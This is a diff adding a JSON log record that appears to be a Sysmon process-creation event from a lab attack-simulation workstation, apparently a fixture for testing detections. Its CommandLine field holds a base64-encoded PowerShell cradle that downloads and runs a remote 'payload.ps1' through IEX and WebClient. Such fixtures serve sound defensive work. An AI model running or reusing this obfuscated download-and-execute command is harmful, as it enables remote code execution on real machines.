@@ -1,0 +1,11 @@
+{
+  "EventID": 1,
+  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADIALgAzADQALgA1ADYALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+  "User": "LAB\\Analyst",
+  "ProcessId": 8452,
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "UtcTime": "2026-03-20 14:25:00.000",
+  "Computer": "WORKSTATION-ATTACKSIM"
+}
